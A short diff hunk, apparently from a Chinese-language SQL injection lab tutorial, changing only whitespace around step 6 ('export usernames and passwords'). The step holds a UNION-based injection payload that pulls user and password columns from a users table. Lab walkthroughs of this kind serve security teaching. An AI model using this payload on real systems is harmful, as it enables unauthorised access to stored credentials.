@@ -84,10 +84,10 @@ text
 ![字段](screenshots/sql_injection/column.png)
 
 6. 导出用户名和密码
-···    
+···     
 text
 1' UNION SELECT user, password FROM users#
-··· 
+···  
 ![字段](screenshots/sql_injection/union.png)
 
 
